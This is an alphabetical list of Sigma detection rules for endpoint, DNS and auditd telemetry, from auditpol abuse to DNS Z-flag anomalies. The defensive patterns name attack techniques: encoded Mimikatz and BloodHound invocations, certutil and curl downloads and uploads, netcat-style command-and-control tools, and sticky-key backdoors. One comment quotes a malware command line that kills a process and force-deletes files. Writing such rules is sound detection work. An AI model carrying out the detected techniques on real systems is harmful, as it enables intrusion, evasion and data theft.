<li><a href="#">title:Suspicious Auditpol Usage id: 0a13e132-651d-11eb-ae93-0242ac130002 description: Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. status: experimental author: Janantha Marasinghe () references: - date: 2021/02/02 modified: 2021/02/02 tags: - attack.defense_evasion - attack.t1562.002 level: high logsource: category: process_creation product: windows detection: selection_auditpol_binary: Image|endswith: '\auditpol.exe' selection_auditpol_command: CommandLine|contains: - 'disable' # disables a specific audit policy - 'clear' # delete or clears audit policy - 'remove' # removes an audit policy - 'restore' # restores an audit policy condition: selection_auditpol_binary and selection_auditpol_command falsepositives: - Admin activity 
<li><a href="#">title:Suspicious Base64 Encoded Powershell Invoke id: 6385697e-9f1b-40bd-8817-f4a91f40508e status: test description: Detects base64 encoded powershell 'Invoke-' call author: pH-T related: - id: fd6e2919-3936-40c9-99db-0aa922c356f7 type: similar date: 2022/05/20 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # Invoke- - 'SQBuAHYAbwBrAGUALQ' - 'kAbgB2AG8AawBlAC0A' - 'JAG4AdgBvAGsAZQAtA' filter_other_rule: # already covered in fd6e2919-3936-40c9-99db-0aa922c356f7 CommandLine|contains: # Invoke-BloodHound - 'SQBuAHYAbwBrAGUALQBCAGwAbwBvAGQASABvAHUAbgBkA' - 'kAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZA' - 'JAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQA' # Invoke-Mimikatz - 'SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA' - 'kAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6A' - 'JAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAeg' # Invoke-WMIExec - 'SQBuAHYAbwBrAGUALQBXAE0ASQBFAHgAZQBjA' - 'kAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAYw' - 'JAG4AdgBvAGsAZQAtAFcATQBJAEUAeABlAGMA' condition: selection and not 1 of filter* fields: - CommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Suspicious Bitsadmin Job via PowerShell id: f67dbfce-93bc-440d-86ad-a95ae8858c90 status: test description: Detect download by BITS jobs via PowerShell author: Endgame, JHasenbusch (ported to sigma for oscd.community) references: - - date: 2018/10/30 modified: 2021/12/03 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: 'Start-BitsTransfer' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Bitstransfer via PowerShell id: cd5c8085-4070-4e22-908d-a5b3342deb74 status: experimental description: Detects transferring files from system on a server bitstransfer Powershell cmdlets references: - tags: - attack.exfiltration - attack.persistence - attack.t1197 date: 2021/08/19 author: Austin Songer @austinsonger logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\powershell.exe' - '\powershell_ise.exe' - '\pwsh.exe' CommandLine|contains: - 'Get-BitsTransfer' - 'Add-BitsFile' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious C2 Activities id: f7158a64-6204-4d6d-868a-6e6378b467e0 status: test description: Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'. This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap. These commands match a few techniques from the tactics "Command and Control", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132) author: Marie Euler references: - '' date: 2020/05/18 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: key: 'susp_activity' condition: selection falsepositives: - Admin or User activity level: medium tags: - attack.command_and_control 
<li><a href="#">title:Suspicious Calculator Usage id: 737e618a-a410-49b5-bec3-9e55ff7fbc15 status: test description: Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion author: Florian Roth references: - date: 2019/02/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: '\calc.exe ' selection2: Image|endswith: '\calc.exe' filter2: Image|contains: '\Windows\Sys' condition: selection1 or ( selection2 and not filter2 ) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1036 
<li><a href="#">title:Suspicious Call by Ordinal id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c description: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal status: stable references: - - - - tags: - attack.defense_evasion - attack.t1218.011 author: Florian Roth date: 2019/10/22 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains: - ',#' - ', #' - '.dll #' # Sysmon removes , in its log - '.ocx #' # HermeticWizard filter: CommandLine|contains|all: - 'EDGEHTML.dll' - '#141' condition: selection and not filter falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Windows control panel elements have been identified as source (mmc) level: high 
<li><a href="#">title:Suspicious Camera and Microphone Access id: 62120148-6b7a-42be-8b91-271c04e281a3 description: Detects Processes accessing the camera and microphone from suspicious folder status: experimental author: Den Iuzvyk date: 2020/06/07 modified: 2021/09/17 references: - tags: - attack.collection - attack.t1125 - attack.t1123 logsource: category: registry_event product: windows detection: selection_1: TargetObject|contains|all: - '\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\' - '\NonPackaged' selection_2: TargetObject|contains: - microphone - webcam selection_3: TargetObject|contains: - ':#Windows#Temp#' - ':#$Recycle.bin#' - ':#Temp#' - ':#Users#Public#' - ':#Users#Default#' - ':#Users#Desktop#' condition: all of selection_* falsepositives: - Unlikely, there could be conferencing software running from a Temp folder accessing the devices level: high 
<li><a href="#">title:Suspicious Certreq Command to Download id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b status: experimental description: Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files author: Christian Burkard date: 2021/11/24 modified: 2022/06/13 references: - logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\certreq.exe' - OriginalFileName: 'CertReq.exe' selection_cli: CommandLine|contains|all: - ' -Post ' - ' -config ' - ' http' - ' C:\windows\win.ini ' condition: all of selection* fields: - CommandLine - ParentCommandLine tags: - attack.command_and_control - attack.t1105 falsepositives: - Unlikely level: high 
<li><a href="#">title:Suspicious Certutil Command id: e011a729-98a6-4139-b5c4-bf6f6dd8239a status: experimental description: Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with the built-in certutil utility author: Florian Roth, juju4, keepwatch date: 2019/01/16 modified: 2021/04/23 references: - - - - - logsource: category: process_creation product: windows detection: parameters: CommandLine|contains: - ' -decode ' - ' -decodehex ' - ' -urlcache ' - ' -verifyctl ' - ' -encode ' - ' /decode ' - ' /decodehex ' - ' /urlcache ' - ' /verifyctl ' - ' /encode ' certutil: Image|endswith: '\certutil.exe' CommandLine|contains: - 'URL' - 'ping' condition: parameters or certutil fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1140 - attack.command_and_control - attack.t1105 - attack.s0160 - attack.g0007 - attack.g0010 - attack.g0045 - attack.g0049 - attack.g0075 - attack.g0096 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high 
<li><a href="#">title:Suspicious Characters in CommandLine id: 2c0d2d7b-30d6-4d14-9751-7b9113042ab9 status: experimental description: Detects suspicious Unicode characters in the command line, which could be a sign of obfuscation or defense evasion date: 2022/04/27 author: Florian Roth references: - logsource: product: windows category: process_creation detection: selection_spacing_modifiers: CommandLine|contains: # spacing modifier letters that get auto-replaced - 'Ë£' # 0x02E3 - 'Ëª' # 0x02EA - 'Ë¢' # 0x02E2 selection_unicode_slashes: # forward slash alternatives CommandLine|contains: - 'âˆ•' # 0x22FF - 'â„' # 0x206F selection_unicode_hyphens: # hyphen alternatives CommandLine|contains: - 'â€•' # 0x2015 - 'â€”' # 0x2014 condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Child Process Created as System id: 590a5f4c-6c8c-4f10-8307-89afe9453a9d status: test description: Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts author: Teymur Kheirkhabarov, Roberto Rodriguez (@Cyb3rWard0g), Open Threat Research (OTR) references: - - - - date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows definition: ParentUser field needs sysmon >= 13.30 detection: selection: ParentUser: - 'NT AUTHORITY\NETWORK SERVICE' - 'NT AUTHORITY\LOCAL SERVICE' - 'AUTORITE NT\' # French language settings User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' User|endswith: # System - '\SYSTEM' - '\Ð¡Ð˜Ð¡Ð¢Ð•ÐœÐ' IntegrityLevel: 'System' rundllexception: Image|endswith: '\rundll32.exe' CommandLine|contains: 'DavSetCookie' condition: selection and not rundllexception falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1134.002 
<li><a href="#">title:Suspicious CLR Logs Creation id: e4b63079-6198-405c-abd7-3fe8b0ce3263 description: Detects suspicious .NET assembly executions. Could detect using Cobalt Strike's command execute-assembly. references: - - - date: 2020/10/12 modified: 2022/06/24 tags: - attack.execution - attack.defense_evasion - attack.t1059.001 - attack.t1218 status: experimental author: omkar72, oscd.community, Wojciech Lesicki logsource: category: file_event product: windows definition: Check your sysmon configuration for monitoring UsageLogs folder. In SwiftOnSecurity configuration we have that thanks @SBousseaden detection: selection: TargetFilename|contains|all: - '\AppData\Local\Microsoft\CLR' - '\UsageLogs\' TargetFilename|contains: - 'mshta' - 'cscript' - 'wscript' - 'regsvr32' - 'wmic' - 'rundll32' - 'svchost' condition: selection falsepositives: - Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - level: high 
<li><a href="#">title:Suspicious Cmdl32 Execution id: f37aba28-a9e6-4045-882c-d5004043b337 status: experimental description: lolbas Cmdl32 is use to download a payload to evade antivirus references: - - tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 author: frack113 date: 2021/11/03 modified: 2022/06/12 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\cmdl32.exe' - OriginalFileName: CMDL32.EXE selection_cli: CommandLine|contains|all: - '/vpn ' - '/lan ' condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Cobalt Strike DNS Beaconing id: f356a9c4-effd-4608-bbf8-408afd5cd006 status: experimental description: Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons author: Florian Roth date: 2021/11/09 references: - - tags: - attack.command_and_control - attack.t1071.004 logsource: product: windows category: dns_query detection: selection1: QueryName|startswith: - 'aaa.stage.' - 'post.1' selection2: QueryName|contains: '.stage.123456.' condition: 1 of selection* fields: - Image - CommandLine falsepositives: - Unknown level: critical 
<li><a href="#">title:Suspicious Code Page Switch id: c7942406-33dd-4377-a564-0f62db0593a3 status: test description: Detects a code page switch in command line or batch scripts to a rare language author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - - date: 2019/10/14 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\chcp.com' CommandLine|endswith: - ' 936' # Chinese # - ' 1256' # Arabic - ' 1258' # Vietnamese # - ' 855' # Russian # - ' 866' # Russian # - ' 864' # Arabic condition: selection fields: - ParentCommandLine falsepositives: - Administrative activity (adjust code pages according to your organisation's region) level: medium tags: - attack.t1036 - attack.defense_evasion 
<li><a href="#">title:Suspicious Commandline Escape id: f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd status: test description: Detects suspicious process that use escape characters author: juju4 references: - - - - - date: 2018/12/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # - <TAB> # no TAB modifier in sigmac yet, so this matches <TAB> (or TAB in elasticsearch backends without DSL queries) - 'h^t^t^p' - 'h"t"t"p' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: low tags: - attack.defense_evasion - attack.t1140 
<li><a href="#">title:Suspicious Commands Linux id: 1543ae20-cbdf-4ec1-8d12-7664d667a825 status: test description: Detects relevant commands often related to malware or hacking activity author: Florian Roth references: - Internal Research - mostly derived from exploit code including code in MSF date: 2017/12/12 modified: 2021/11/27 logsource: product: linux service: auditd detection: cmd1: type: 'EXECVE' a0: 'chmod' a1: '777' cmd2: type: 'EXECVE' a0: 'chmod' a1: 'u+s' cmd3: type: 'EXECVE' a0: 'cp' a1: '/bin/ksh' cmd4: type: 'EXECVE' a0: 'cp' a1: '/bin/sh' condition: 1 of cmd* falsepositives: - Admin activity level: medium tags: - attack.execution - attack.t1059.004 
<li><a href="#">title:Suspicious Compression Tool Parameters id: 27a72a60-7e5e-47b1-9d17-909c9abafdcd status: test description: Detects suspicious command line arguments of common data compression tools author: Florian Roth, Samir Bousseaden references: - date: 2019/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - '7z*.exe' - '*rar.exe' - '*Command*Line*RAR*' CommandLine|contains: - ' -p' - ' -ta' - ' -tb' - ' -sdel' - ' -dw' - ' -hp' falsepositive: ParentImage|startswith: 'C:\Program' condition: selection and not falsepositive falsepositives: - Unknown level: high tags: - attack.collection - attack.t1560.001 
<li><a href="#">title:Suspicious Computer Account Name Change CVE-2021-42287 id: 45eb2ae2-9aa2-4c3a-99a5-6e5077655466 status: experimental description: Detects the renaming of an existing computer account to a account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287 references: - author: Florian Roth date: 2021/12/22 logsource: product: windows service: security detection: selection: EventID: 4781 # rename user OldTargetUserName|contains: '$' filter: NewTargetUserName|contains: '$' condition: selection and not filter fields: - EventID - SubjectUserName falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Computer Machine Password by PowerShell id: e3818659-5016-4811-a73c-dde4679169d2 status: experimental description: The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain. You can use it to reset the password of the local computer. references: - - author: frack113 date: 2022/02/21 logsource: product: windows category: ps_module detection: selection: ContextInfo|contains: 'Reset-ComputerMachinePassword' condition: selection falsepositives: - Administrator PowerShell scripts level: medium tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Suspicious ConfigSecurityPolicy Execution id: 1f0f6176-6482-4027-b151-00071af39d7e status: experimental description: Upload file, credentials or data exfiltration with Binary part of Windows Defender references: - tags: - attack.exfiltration - attack.t1567 author: frack113 date: 2021/11/26 modified: 2022/05/16 logsource: category: process_creation product: windows detection: lolbas: - CommandLine|contains: ConfigSecurityPolicy.exe - Image|endswith: '\ConfigSecurityPolicy.exe' - OriginalFileName: 'ConfigSecurityPolicy.exe' remote: CommandLine|contains: - 'https://' - 'http://' - 'ftp://' condition: lolbas and remote falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Conhost Legacy Option id: 3037d961-21e9-4732-b27a-637bcc7bf539 status: experimental description: ForceV1 asks for information directly from the kernel space. Conhost connects to the console application references: - - author: frack113 date: 2022/04/04 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - 'conhost.exe' - '0xffffffff' - '-ForceV1' condition: selection falsepositives: - Unknown level: informational tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Suspicious Connection to Remote Account id: 1883444f-084b-419b-ac62-e0d0c5b3693f status: experimental description: | Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism references: - author: frack113 date: 2021/12/27 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier' - 'System.Net.NetworkCredential' - 'System.DirectoryServices.Protocols.LdapConnection' condition: selection falsepositives: - Unknown level: low tags: - attack.credential_access - attack.t1110.001 
<li><a href="#">title:Suspicious Control Panel DLL Load id: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819 status: test description: Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits author: Florian Roth references: - date: 2017/04/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\System32\control.exe' Image|endswith: '\rundll32.exe ' filter: CommandLine|contains: 'Shell32.dll' condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Suspicious Copy From or To System32 id: fff9d2b7-e11c-4a69-93d3-40ef66189767 status: test description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name author: Florian Roth, Markus Neis, Tim Shelton (HAWK.IO) references: - date: 2020/07/03 modified: 2021/12/30 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'xcopy*\System32\' - 'cmd.exe*/c*copy*\System32\' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Admin scripts like - False positive when cmd.exe and xcopy.exe are called directly # C:\Windows\System32\cmd.exe /c copy file1 file2 level: medium tags: - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Suspicious Creation TXT File in User Desktop id: caf02a0a-1e1c-4552-9b48-5e070bd88d11 status: experimental description: Ransomware create txt file in the user Desktop author: frack113 references: - date: 2021/12/26 logsource: product: windows category: file_event detection: selection: Image|endswith: \cmd.exe TargetFilename|contains|all: - \Users\ - \Desktop\ TargetFilename|endswith: .txt condition: selection falsepositives: - Unknown level: high tags: - attack.impact - attack.t1486 
<li><a href="#">title:Suspicious Creation with Colorcpl id: e15b518d-b4ce-4410-a9cd-501f23ce4a18 status: experimental description: Once executed, colorcpl.exe will copy the arbitrary file to c:\windows\system32\spool\drivers\color\ author: frack113 references: - date: 2022/01/21 logsource: product: windows category: file_event detection: selection: Image|endswith: \colorcpl.exe valid_ext: TargetFilename|endswith: - .icm - .gmmp - .cdmp - .camp condition: selection and not valid_ext falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564 
<li><a href="#">title:Suspicious Csc.exe Source File Folder id: dcaa3f04-70c3-427a-80b4-b870d73c94c4 description: Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData) status: experimental references: - - - - author: Florian Roth date: 2019/08/24 modified: 2021/02/01 tags: - attack.defense_evasion - attack.t1027.004 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\csc.exe' CommandLine|contains: - '\AppData\' - '\Windows\Temp\' filter: - ParentImage|startswith: 'C:\Program Files' # - ParentImage|endswith: - '\sdiagnhost.exe' # - '\w3wp.exe' # - '\choco.exe' # Chocolatey - ParentCommandLine|contains: - '\ProgramData\Microsoft\Windows Defender Advanced Threat Protection' condition: selection and not filter falsepositives: - Legitimate software from program files - - Legitimate Microsoft software - level: medium 
<li><a href="#">title:Suspicious Csi.exe Usage id: 40b95d31-1afc-469e-8d34-9a3a667d058e description: Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft â€œRoslynâ€ Community Technology Preview was named 'rcsi.exe' status: experimental author: Konstantin Grishchenko, oscd.community date: 2020/10/17 modified: 2021/05/11 references: - - - - tags: - attack.execution - attack.t1072 - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: basic: - Image|endswith: '\csi.exe' - Image|endswith: '\rcsi.exe' renamed: - OriginalFileName: 'csi.exe' - OriginalFileName: 'rcsi.exe' selection: Company: 'Microsoft Corporation' condition: (basic or renamed) and selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Legitimate usage by software developers level: medium 
<li><a href="#">title:Suspicious Curl Change User Agents id: 3286d37a-00fd-41c2-a624-a672dcd34e60 status: experimental description: Detects a suspicious curl process start on Windows with set useragent options author: frack113 references: - - date: 2022/01/23 logsource: category: process_creation product: windows detection: selection_curl: - Image|endswith: '\curl.exe' - Product: 'The curl executable' selection_opt: CommandLine|contains: - ' -A ' - ' --user-agent ' condition: all of selection_* fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins - Administrative activity level: medium tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Suspicious Curl File Upload id: 00bca14a-df4e-4649-9054-3f2aa676bc04 status: test description: Detects a suspicious curl process start the adds a file to a web request author: Florian Roth references: - - - - date: 2020/07/03 modified: 2022/01/22 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\curl.exe' - Product: 'The curl executable' selection_cli: CommandLine|contains: - ' -F ' - ' --form ' - ' -T ' - ' --upload-file ' - ' -d ' - ' --data ' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins level: medium tags: - attack.exfiltration - attack.t1567 - attack.t1105 
<li><a href="#">title:Suspicious Curl Usage on Windows id: e218595b-bbe7-4ee5-8a96-f32a24ad3468 status: experimental description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file author: Florian Roth, Nasreddine Bencherchali (updated) references: - - - date: 2020/07/03 modified: 2022/07/05 logsource: category: process_creation product: windows detection: selection_curl: - Image|endswith: '\curl.exe' - Product: 'The curl executable' selection_susp_locations: CommandLine|contains: - '\AppData\' - '\Users\Public\' - '\Temp' - '%AppData%' - '%Temp%' - '%Public%' - '\Desktop' selection_susp_extensions: CommandLine|endswith: - '.jpg' - '.jpeg' - '.png' - '.gif' - '.tmp' - '.temp' - '.txt' selection_susp_remote_name: CommandLine|contains: - ' -O' # alias for --remote-name - '--remote-name' condition: selection_curl and 1 of selection_susp* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Suspicious Debugger Registration Cmdline id: ae215552-081e-44c7-805f-be16f975c8a2 status: test description: Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor). author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - date: 2019/09/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: '\CurrentVersion\Image File Execution Options\' selection2: CommandLine|contains: - 'sethc.exe' - 'utilman.exe' - 'osk.exe' - 'magnify.exe' - 'narrator.exe' - 'displayswitch.exe' - 'atbroker.exe' condition: all of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.008 
<li><a href="#">title:Suspicious Del in CommandLine id: 204b17ae-4007-471b-917b-b917b315c5db status: experimental description: suspicious command line to remove exe or dll author: frack113 date: 2021/12/02 references: - tags: - attack.defense_evasion - attack.t1070.004 logsource: category: process_creation product: windows detection: susp_del_exe: CommandLine|contains|all: - 'del *.exe' - '/f ' - '/q ' susp_del_dll: CommandLine|contains|all: - 'del *.dll' - 'C:\ProgramData\' condition: susp_del_exe or susp_del_dll #cmd.exe (PID: 1044 cmdline: 'C:\Windows\System32\cmd.exe' /c taskkill /im A8D4.exe /f & timeout /t 6 & del /f /q 'C:\Users\user~1\AppData\Local\Temp\A8D4.exe' & del C:\ProgramData\*.dll & exit falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious desktop.ini Action id: 81315b50-6b60-4d8f-9928-3466e1022515 status: test description: Detects unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk. author: Maxime Thiebaut (@0xThiebaut), Tim Shelton (HAWK.IO) references: - date: 2020/03/19 modified: 2021/12/03 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '\desktop.ini' filter: Image|startswith: - 'C:\Windows\' - 'C:\Program Files\' - 'C:\Program Files (x86)\' condition: selection and not filter falsepositives: - Operations performed through Windows SCCM or equivalent - Read only access list authority level: medium tags: - attack.persistence - attack.t1547.009 
<li><a href="#">title:Suspicious Desktopimgdownldr Command id: bb58aa4a-b80b-415a-a2c0-2f65a4c81009 status: test description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet author: Florian Roth references: - - date: 2020/07/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: ' /lockscreenurl:' selection1_filter: CommandLine|contains: - '.jpg' - '.jpeg' - '.png' selection_reg: CommandLine|contains|all: - 'reg delete' - '\PersonalizationCSP' condition: ( selection1 and not selection1_filter ) or selection_reg fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Suspicious Desktopimgdownldr Target File id: fc4f4817-0c53-4683-a4ee-b17a64bc1039 status: test description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension author: Florian Roth references: - - date: 2020/07/03 modified: 2022/06/02 logsource: product: windows category: file_event detection: selection: Image|endswith: '\svchost.exe' TargetFilename|contains: '\Personalization\LockScreenImage\' filter1: TargetFilename|contains: 'C:\Windows\' filter2: TargetFilename|contains: - '.jpg' - '.jpeg' - '.png' condition: selection and not filter1 and not filter2 fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1105 
<li><a href="#">title:Suspicious Diantz Alternate Data Stream Execution id: 6b369ced-4b1d-48f1-b427-fdc0de0790bd status: experimental description: Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file. references: - tags: - attack.defense_evasion - attack.t1564.004 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - diantz.exe - .cab CommandLine|re: ':[^\\\\]' condition: selection falsepositives: - Very Possible level: medium 
<li><a href="#">title:Suspicious Diantz Download and Compress Into a CAB File id: 185d7418-f250-42d0-b72e-0c8b70661e93 status: experimental description: Download and compress a remote file and store it in a cab file on local machine. references: - tags: - attack.command_and_control - attack.t1105 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - diantz.exe - ' \\' - '.cab' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious DIR Execution id: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006 status: experimental description: Use dir to collect information references: - author: frack113 date: 2021/12/13 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'dir ' - ' /s' - ' /b' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1217 
<li><a href="#">title:Suspicious DNS Query for IP Lookup Service APIs id: ec82e2a5-81ea-4211-a1f8-37a0286df2c2 description: Detects DNS queries for ip lookup services such as api.ipify.org not originating from a browser process. status: experimental date: 2021/07/08 modified: 2021/09/10 author: Brandon George (blog post), Thomas Patzke (rule) references: - - tags: - attack.reconnaissance - attack.t1590 falsepositives: - Legitimate usage of ip lookup services such as ipify API level: medium logsource: product: windows category: dns_query detection: dns_request: QueryName: - canireachthe.net - ipv4.icanhazip.com - ip.anysrc.net - edns.ip-api.com - wtfismyip.com - checkip.dyndns.org - api.2ip.ua - icanhazip.com - api.ipify.org - ip-api.com - checkip.amazonaws.com - ipecho.net - ipinfo.io - ipv4bot.whatismyipaddress.com - freegeoip.app browser_process: Image|endswith: - \chrome.exe - \iexplore.exe - \firefox.exe - \brave.exe - \opera.exe - \msedge.exe - \vivaldi.exe condition: dns_request and not browser_process 
<li><a href="#">title:Suspicious DNS Query with B64 Encoded String id: 4153a907-2451-4e4f-a578-c52bb6881432 status: experimental description: Detects suspicious DNS queries using base64 encoding author: Florian Roth date: 2018/05/10 modified: 2021/08/09 references: - logsource: category: dns detection: selection: query|contains: '==.' condition: selection falsepositives: - Unknown level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:Suspicious DNS Z Flag Bit Set id: ede05abc-2c9e-4624-9944-9ff17fdc0bf5 description: 'The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused). Although recently it has been used in DNSSec, the value being set to anything other than 0 should be rare. Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward. Determine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering. This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: ' status: experimental date: 2021/05/04 modified: 2022/02/24 references: - '' - '' - '' - '' author: '@neu5ron, SOC Prime Team, Corelight' tags: - attack.t1095 - attack.t1571 - attack.command_and_control logsource: product: zeek service: dns detection: z_flag_unset: Z: '0' most_probable_valid_domain: query|contains: '.' exclude_tlds: query|endswith: - '.arpa' - '.local' - '.ultradns.net' - '.twtrdns.net' - '.azuredns-prd.info' - '.azure-dns.com' - '.azuredns-ff.info' - '.azuredns-ff.org' - '.azuregov-dns.org' exclude_query_types: qtype_name: - 'NS' - 'ns' - 'MX' - 'mx' exclude_responses: answers|endswith: '\\x00' exclude_netbios: id.resp_p: - '137' - '138' - '139' condition: not z_flag_unset and most_probable_valid_domain and not (exclude_tlds or exclude_query_types or exclude_responses or exclude_netbios) falsepositives: - 'Internal or legitimate external domains using DNSSec. Verify if these are legitimate DNSSec domains and then exclude them.' - 'If you work in a Public Sector then it may be good to exclude things like endswith ".edu", ".gov" and or ".mil"' level: medium fields: - ts - id.orig_h - id.orig_p - id.resp_h - id.resp_p - proto - qtype_name - qtype - query - answers - rcode - rcode_name - trans_id - qtype - ttl - AA - uid 
